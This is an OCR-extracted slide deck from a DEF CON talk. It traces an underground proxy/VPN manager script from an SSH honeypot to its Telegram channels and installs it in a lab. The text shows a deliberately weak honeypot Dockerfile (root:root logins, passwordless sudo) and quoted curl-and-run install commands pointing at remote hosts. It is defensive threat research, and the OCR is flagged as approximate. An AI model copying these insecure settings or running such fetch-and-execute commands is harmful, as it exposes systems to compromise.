---
title: "Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure"
speakers: ["Assaf Morag"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf"
pages: 144
sha256: "22521e71cd216569b3b7b7adbc995a83837c3636dd082c853f70d5759bca6665"
text_chars: 50210
ocr_pages: 91
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.5
ocr_unreliable_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:24:17Z"
---
# Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure

**Speakers:** Assaf Morag  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf` (144 pages)


## Slide 1

**Hacking the Hackers Who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure Assaf Morag**

## Slide 2

## Slide 3

**HONEYPOTS**

## Slide 4

**HONEYPOTS**

## Slide 5

**HONEYPOTS RUNNING ON CONTAINERS**

## Slide 6

**HONEYPOTS RUNNING ON CONTAINERS**


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HONEYPOTS RUNNING ON CONTAINERS
ubuntu@FlareResearch:~/Honeypots/SSH$ cat Dockerfile
FROM ubuntu:24.04
USER root
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && \
apt-get install -y openssh-server sudo && \
rm -rf /var/lib/apt/lists/x
mkdir -p /var/run/sshd
echo “root:root" | chpasswd
for user in sock proxy vpn sshuser; do \
useradd -m -s /bin/bash "$user"; \
echo "$user:$user" | chpasswd; \
done
echo "%sudo ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sed -i 's/*#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
sed -i 's/*#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
EXPOSE 22
CMD ["/usr/sbin/ssh
ubuntu@FlareResearch:~/Honeypots/SSH$ |
```

## Slide 7

**HONEYPOTS RUNNING ON CONTAINERS**


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HONEYPOTS RUNNING ON CONTAINERS
RUN echo "root:root" | chpasswd
```

## Slide 8

**SSH HONEYPOT**

## Slide 9

**IN ONE OF THESE ATTACKS**


> Recovered by OCR — confidence 88/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IN ONE OF THESE ATTACKS
ubuntu@FlareResearch:~/Honeypots/SSH$ cat attack_dump_3
{
"attack_number": 379,
"event_type": "SSH_Honeypot",
"hostname": "XX.XX.XX.XX"
}
{
"origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/menu.sh",
"downloaded": true
"name": "install_mod",
"origin "https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh",
"downloaded": true
"name" install.sh",
"origi "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/install.sh"
"repository": "FirewallFalcon-—Manager"
"downloaded": true
"network": {
"protocol "HTTPS"
"user_age curl/8.5.0"
}
```

## Slide 10

**IN ONE OF THESE ATTACKS**


> Recovered by OCR — confidence 92/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IN ONE OF THESE ATTACKS
"repository": "FirewallFalcon-Manager",
"downloaded": true
```

## Slide 11

**CROWDSTRICK’S FIREWALL FALCON MANAGER**

## Slide 12

**DOWNLOADED FROM GITHUB**


> Recovered by OCR — confidence 90/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DOWNLOADED FROM GITHUB
"reposito
"downloaded": true
```

## Slide 13

### **THE GITHUB REPOSITORY**

Deleted in May 2026 New and modified tool available now on: https://codeberg.org/firewallfalcons


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE GITHUB REPOSITORY
“f FirewallFalcon Manager
FirewallFalcon Manager — A powerful and unified proxy/VPN management script for Linux servers. It supports
multiple tunneling protocols, user management, SSL automation, and an Nginx gateway that handles all traffic
efficiently.
Quick Installation
Run the following command to install the latest version:
curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager Oo
te fl d re Deleted in May 2026
New and modified tool available now on: https://codeberg.org/firewallfalcons
```

## Slide 14

POWERFUL?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 15

POWERFUL?

UNIFIED?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 16

POWERFUL?

UNIFIED?

PROXY?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 17

POWERFUL?

UNIFIED?

PROXY?

VPN?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 18

POWERFUL?

UNIFIED?

MANAGEMENT

PROXY?

VPN?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 19

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 20

**A LEAD TO A TELEGRAM GROUP**


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
A LEAD TO A TELEGRAM GROUP
“-, Community & Support
e Telegram Channel: t.me/firewallfalcons - Join for updates and support!
FIREWALL
FALCONS
```

## Slide 21

**DISCOVERY: FINDING LEADS**


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
4 SHODAN Explore Downloads Pricing @ "t.me/firewallfalcons" Account
TOTAL RESULTS
anetencenecencenncenenenceeeenenencsens tt View Report &4 Download Results lu Historical Trend ( View on Map Q Advanced Search
204 Product Spotlight: Free, Fast IP Lookups for Open Ports and Vulnerabilities using InternetDB
81.208.191.4 (7 2026-07-15T06:17:31.748990
Oracle Svenska AB HIIP/1.1 101 t.me/firewallfalcons
® saudi Arabia, Jeddah Server: nginx
Date: Wed, 15 Jul 2026 06:17:31 GMT
Connection: upgrade
38.248.6.105 [7 2026-07-15T05:22:42.191678
: Cogent Communications HTTP/1.1 101 t.me/firewallfalcons
Germany 64 © United States, Newark Server: nginx
G6 Date: Wed, 15 Jul 2026 05:22:47 GMT
United States 48 Connection: upgrade
Singapore 19
United Kingdom 14 38.248.6.103 G 2026-07-15T05:11:42.228347
Cogent Communications HTTP/1.1 101 t.me/firewallfalcons
France 12 © United States, Newark TON CEN CENT Cl eS
More...
38.248.6.95 (7 2026-07-15102:37:49.531589
FOP PORTS ee Cogent Communications & SSL Certificate HTTP/1.1 101 t.me/firewallfalcons
80 97 © united States, Newark Issued By: 5 TTX
| Common Name: Date: Wed, 15 Jul 2026 02:37:49 GMT
8080 56 38.248.6.95 Content-Length: @
Connection: upgrade
443 45 Issued To:
|- Common Name:
8888 2 38.248.6.95
Supported SSL Versions:
81 1
TLSv1.2, TLSv1.3
More...
```

## Slide 22

### **DISCOVERING THE TELEGRAM GROUPS**

|**Type**|Broadcast channel|**Type**|Chat group|
|---|---|---|---|
|**Members**|3,843|**Members**|982|
|**Messages**|329|**Messages**|1,661|
|**Active window**|23 Nov 2024–10 Jul 2026|**Active window**|18 Nov 2025–13 Jul 2026|

## Slide 23

### **DISCOVERING THE TELEGRAM GROUPS**

#### Activity timeline of the Telegram broadcast channel

#### Activity timeline of the Telegram chat group

## Slide 24

**TELEGRAM LANGUAGE DISTRIBUTION**


> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TELEGRAM LANGUAGE DISTRIBUTION
| LANGUAGE DISTRIBUTION
LANGUAGE
© Latin/English 72.08%
72,08% Arabic 27,92%
+flare
```

## Slide 25

**TELEGRAM MENTIOND COUNTRIES DISTRIBUTION**


> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TELEGRAM MENTIOND COUNTRIES DISTRIBUTION
COUNTRY DISTRIBUTION
COUNTRY
©) Morocco
Big UK
fm Egypt
8 India
lraq
(Sm Sudan
fem Jordan
GIS Kenya
& Brazil
= Syria
(®) Saudi Arabia
G™ Chile
OB Nigeria
```

## Slide 26

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**


> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
’) OstoraPremium App Source Code FOR SALE ¢§
¥ “4 Contact: @FirewallFalcon
= OstoraOrg Q
Ostora TV a —
Watch Live TV Sports Channel and ive spon =
HD Movies Free
sia) Fast Free Secure
DOWNLOAD OSTORA TV APK
Security Verified
GD cmsecurity G Lookout [YJ McAfee
Download Ostora TV APK to watch live TV, sports, and movies in HD.
Enjoy ad-free streaming, offline videos and multiple languages easily.
```

## Slide 27

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**


> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
FirewallFalcon
Private service: Hacking any IPTV.
Create your own IPTV.
Hack any live football match websites.
```

## Slide 28

**1**

### **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

**2**

**3**


> Recovered by OCR — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
1] i) Hetzner Server Auction
Discounted dedicated servers with full root access.
® Prices drop over time + %& Refurbished hardware + i?) EU
datacenters
Perfect for budget projects, labs, and long-term servers.
~
» Hetzner
Refurbished server for sale in Hetzner Server Auction
Be quick and save money: Top and cheap refurbished dedicated
servers at Hetzner Server Auction
FirewallFalcon
3 SCAM ALERT - WARNING T...
I bought a VPS, but it's not working.
Deleted Account
I bought a VPS, but it's not working.
He scammed you, you dummy. ‘3
```

## Slide 29

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
FirewallFalcon
9 Nant a full tutorial on TCP Bypass Proxy?
‘| Learn how to bypass restrictions like a pro!
& Like & drop a comment if you're interested —
T'll post the full guide once we hit enough interest! ~~
@BD 19 comments
© 35
FirewallFalcon
FirewallFalcon
9 Want a full tutorial on TCP Bypass Proxy? \ | Learn...
__ If You have a clean Vps Contact me to do the tutorial on it
| Ubuntu 20.04.6 LTS is recommended
| x86-64 architecture
@firewallfalcon
© Leave a comment
June 4, 2025
FirewallFalcon
Want a full tutorial on TCP Bypass Proxy?
~ Learn how to bypass restrictions like a pro!
% Like & drop a comment if you're interested —
I'll post the full guide once we hit enough interest! y=
GBD 19 comments
FirewallFalcon
9 Want a full tutorial on TCP Bypass Proxy? Lal Learn...
If You have a clean Vps Contact me to do the tutorial on it
Ubuntu 20.04.6 LTS is recommended
x86-64 architecture
@firewallfalcon
a & 7 v 1 © 3346 edited 3:45PM
```

## Slide 30

### **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

## Slide 31

**TELEGRAM CONTENT ANALYSIS**


> Recovered by OCR — confidence 83/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CONTENT TYPE MSGS % OF 329
G FirewallFalcon related 1 57
FIREWALL (infrastructure / artifacts / URLs / ee eee | F 48.0%
FALCON configs / logs / panels / etc.) (48%)
Tunnel / VPN /
@)) Carrier-name oe
A targeting 14 4.3%
Hacking / 9
Payment / ny
ES monetization at 6 1.8%
© pirated releases ie: 3 0.9%
NUMBER OF MESSAGES
| FIREWALLFALCON RELATED CONTENT: 157 MESSAGES (48% OF TOTAL 329)
```

## Slide 32

**TELEGRAM CONTENT ANALYSIS**


> Recovered by OCR — confidence 80/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CONTENT TYPE MSGS : %OF 1,661 )
FirewallFalcon related |
sere configs / logs / panels / etc.) (10.00%)
H 9,
ay Hacking / 5
NUMBER OF MESSAGES .
2 a MESSAGES IN DISPLAYED CATEGORIES OTHER CONTENT — \
oP 186 (11.20%) 1,475 (88.80%) —— J
L G FIREWALLFALCON RELATED CONTENT: 165 MESSAGES (10.90% OF TOTAL 1,661) )
```

## Slide 33

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**


> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
FirewallFalcon
f % FirewallFalcon Manager — COMING SOON! ¢*)
Ultimate SSH Manager for ARM & x64 devices Mill
“X Now’s your chance to help shape it!
Do YOU want any specific features?
Any modifications you'd like to see?
```

## Slide 34

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
FirewallFalcon Manager v1.0
SYSTEM RESOURCES
FirewallFalcon Manager v
|
SYSTEM RESOURCES
USER MANAGEMENT
Create New User 5) Unlock User Account
Delete User List ALl Managed Users
Edit User Details Renew User Account
Lock User Account
PROTOCOL MANAGEMENT
Install badvpn (UDP 7300) (A
Uninstall badvpn
Install SSL Tunnel (Port 443)
}) Uninstall SSL Tunnel
SYSTEM UTILITIES Install WebSocket Proxy (80, 8080)
Uninstall WebSocket Proxy
Protocol Management Cleanup Expired Users
Return to Main Menu
DANGER ZONE Select an option: Jf
19) Uninstall FirewallFalcon
Select an option: Jj
```

## Slide 35

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
June 19, 2025
r Photo
| @ New Feature Suggestion!
Would you like us to add a Cloudflare Domain Option (} to the
script? © 2707 4:42 PM
»D 9 comments
```

## Slide 36

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**


> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT &)
FirewallFalcon
( 3% Should I Create a New UDP Protocol for You? 2< i
I've been thinking...
What if we had our own custom UDP protocol — built from scratch,
optimized for speed, stealth, and bypassing ISP restrictions? =» Be
vv Also — does UDP work on your network for free?
/
aD 9 comments
```

## Slide 37

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**


> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
_ FirewallFalcon
_ & Testing a New SSL Tunnel
\ g SSH over HAProxy SSL is now being tested!
°
«> This method could help bypass fingerprinting by firewalls and
improve stealth.
If you're interested in trying it out or want more details, drop a
reaction below! <}
```

## Slide 38

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**


> Recovered by OCR — confidence 87/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
Photo
of New Feature Poll
Yes
No
© Leave a comment
_ Should we add v2ray DNSTT support to the script?
©
```

## Slide 39

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**


> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
Sle eee, November 18,2025 |
FirewallFalcon Manager Update Coming Soon
__ Anew update is on the way with enhanced SSH user
If a user exceeds their usage limits, they will be disconnected from
all devices and locked for 120 seconds before regaining access.
© 2668
| FirewallFalcon channel
) MAJOR UPDATE AVAILABLE FOR FirewallFalcon Manager
}, CRITICAL STEPS — READ CAREFULLY:
UNINSTALL the old script entirely. Bb
BACKUP your users first! Do not forget this. P*4
INSTALL the new version below: =»
bash <(curl -fsSL https://thefirewoods.org)
```

## Slide 40

**LET’S RECAP…**

## Slide 41

## Slide 42

**CRUSH COURSE ON VPN**


> Recovered by OCR — confidence 96/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CRUSH COURSE ON VPN
VPN Server
```

## Slide 43

**WHY USE A VPN?**

## Slide 44

### **WHAT DOES FIREWALL FALCON OFFER?**

**The Core Concept: One HTTPS Entry Point, Many Hidden Services** At a high level, these stacks are built around three layers:

- <u>Entry Layer: Web Infrastructure (Usually Nginx) that acts as the public-</u> facing HTTPS server and traffic router.

- <u>Transport Layer: Tunnel Frameworks (V2Ray, XRay, WebSocket tunnels,</u> DNS tunnels) encapsulate traffic inside allowed protocols.

- <u>Service Layer: Actual Functionality, which include VPN connections, SSH</u> sessions, proxy relays, or arbitrary TCP tunnels.

## Slide 45

**WHAT DOES FIREWALL FALCON OFFER?**


> Recovered by OCR — confidence 84/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WHAT DOES FIREWALL FALCON OFFER?
jen gf
Web Server —
ail —
Client Obfuscated Tunnelcore Routing rules Outbound
transport
```

## Slide 46

**LET’S INSTALL (AS A CONTAINER)**


> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
LET’S INSTALL (AS A CONTAINER)
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker build -t tests/firewallfalcon .
[+] Building 19. a8 (9/9) PASS docker:default
r from Dockerfile Q.0s
rary/ubuntu:
update && apt-—ge
./FirewallFalcon
c445b7caba8
8@aac
> => unpacking to docker sts/firewallfalcon:
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker ps -a
CONTAINER ID IMAGE COMMAND CREATED STATUS NAMES
df928c69dc21 tests/firewallfalcon "sh ./FirewallFalcon.." 3 seconds ago Exited (8) 2 seconds ago bold_kilby
2d53844b97f1 £259b650c524 "sh ./FirewallFalcon.." 2 minutes ago Exited (127) 2 minutes ago goofy_diffie
```

## Slide 47

### **LET’S INSTALL (FROM INSIDE A CONTAINER)**


> Recovered by OCR — confidence 92/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S INSTALL (FROM INSIDE A CONTAINER)
Installing FirewallFalcon Manager...
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
```

## Slide 48

**LET’S INSTALL (NON-ROOT)**


> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S INSTALL (NON-ROOT)
ubuntu@FlareResearch:~/Containers/FirewallFalcon-Manager$ ./install.sh
Error: This script must be run as root.
```

## Slide 49

**LET’S INSTALL (ON A NEW VM-LAB)**


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S INSTALL (ON A NEW VM-LAB)
root@ip-—172-31-32-128:~# curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
10@ 2124 100 2124 () @ 13355 Q@ --t--8-— ti 3-3 -— 13443
sudo: unable to resolve host ip-172-31-32-128: Name or service not known
Installing FirewallFalcon Manager...
Applying FirewallFalcon SSH configuration...
SSH configuration validated.
SSH service restarted.
Initializing FirewallFalcon Manager setup...
a
Configuring user limiter service...
@ Setup finished.
Installation complete!
Type 'menu' to start.
```

## Slide 50

**LET’S PLAY**


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
@ Select
Ubuntu 24.04.3 LTS
22.60% Used
@ Managed Accounts
Create New User
Delete User
Renew User Account
Lock User Account
Protocol Manager
DT Proxy Manager
CloudFlare Free Domain
SSH Banner Config
Auto-Reboot Task
Uninstall Script
an option: |
| Uptime: 6 hours, 41 minutes
| Online Sessions: @
| Sys Load (1m): 0.03
Unlock User Account
Edit User Details
List Managed Users
Generate Client Config
Traffic Monitor (Lite)
Block Torrent (Anti-P2P)
Backup User Data
Restore User Data
Cleanup Expired Users
Q@] Exit
```

## Slide 51

**LET’S PLAY**


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 42 minutes
Memory 22.70% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): @.02
@M User 'test_user' created successfully!
® Username: test_user
Password: 123456
Gf Connection Limit:
Do you want to generate a client connection config for this user? (y/n): ff
```

## Slide 52

**LET’S PLAY**


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
@ Do you want to generate a client connection config for this user? (y/n): y
Copy the details below to your clipboard:
® User Details
e Username: test_user
e Password: 123456
SSH Direct:
e Host:
e Port: 22
e payload: (Standard SSH)
Press [Enter] to return to the menu...
```

## Slide 53

**LET’S PLAY**


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
@ Select
Ubuntu 24.04.3 LTS
22.60% Used
@ Managed Accounts
Create New User
Delete User
Renew User Account
Lock User Account
Protocol Manager
DT Proxy Manager
CloudFlare Free Domain
SSH Banner Config
Auto-Reboot Task
Uninstall Script
an option: |
| Uptime: 6 hours, 41 minutes
| Online Sessions: @
| Sys Load (1m): 0.03
Unlock User Account
Edit User Details
List Managed Users
Generate Client Config
Traffic Monitor (Lite)
Block Torrent (Anti-P2P)
Backup User Data
Restore User Data
Cleanup Expired Users
Q@] Exit
```

## Slide 54

**LET’S PLAY**


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
waa MANAGEMENT PANELS -——-—
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
```

## Slide 55

**LET’S PLAY**


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
wa MANAGEMENT PANELS ---
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
```

## Slide 56

**LET’S PLAY**


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
® Checking if port 444 is available...
M Port 444 is free to use.
@BNo active firewall (UFW or firewalld) detected. Assuming ports are open.
@Y Generating self-signed SSL certificate...
M Certificate created: /etc/firewallfalcon/ssl/firewallfalcon.pem
H Creating HAProxy configuration for port 444...
®BReloading and starting HAProxy service...
@ SUCCESS: SSL Tunnel is active.
Clients can now connect to this server's IP on port 444 using an SSL/TLS tunnel.
Press [Enter] to return to the menu...
```

## Slide 57

**LET’S PLAY**


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
wa MANAGEMENT PANELS ---
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
```

## Slide 58

**LET’S PLAY**


> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
Ubuntu 24.04.3 LTS | Uptime: 6 hours, 5@ minutes
23.86% Used | Online Sessions: @
1 Managed Accounts | Sys Load (1m): @.02
% Forcing release of Port 53 (stopping systemd-resolved)...
® Checking if port 53 (UDP) is available...
M Port 53 (UDP) is free to use.
GBNo active firewall (UFW or firewalld) detected. Assuming ports are open.
Please choose where DNSTT should forward traffic:
[ 1] ™®Forward to local SSH service (port 22)
[ 2] ®Forward to local V2Ray backend (port 8787)
@ Enter your choice [2]: J
```

## Slide 59

**LET’S PLAY**


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
Your connection details:
— Tunnel Domain: tun- .manager.firewallfalcon.qzz.io
— Public Key:
— Forwarding To: V2Ray (port 8787)
— Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)
```

## Slide 60

**LET’S PLAY**


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
wa MANAGEMENT PANELS ---
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
```

## Slide 61

**LET’S PLAY**


> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
WebBasePath:
If you forgot your login info, you can type 'x-ui settings' to check
Start migrating database...
Migration done!
Created symlink /etc/systemd/system/multi-user.target.wants/x-ui.service >
x-ui v1.10.1 installation finished, it is up and running now...
You may access the Panel with following URL(s):
Local address:
Global address:
Control Menu Usage
SUBCOMMANDS :
x-ui Admin Management Script
x-ui start Start
x-ui stop Stop
x-ui restart Restart
x-ui status Current Status
x-ui settings Current Settings
x-ui enable Enable Autostart on OS Startup
x-ui disable Disable Autostart on OS Startup
x-ui log Check Logs
x-ui update Update
x-ui install Install
x-ui uninstall Uninstall
Control Menu Usage
Press [Enter] to return to the menu...
```

## Slide 62

### **LET’S PLAY**

Tool’s UI – available on http://IP_ADDRESS:43237/<<Random_String>>


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
Welcome
Log In
# English
Tool’s UI — available on http://IP_ADDRESS:43237/<<Random_String>>
```

## Slide 63

**LET’S PLAY**


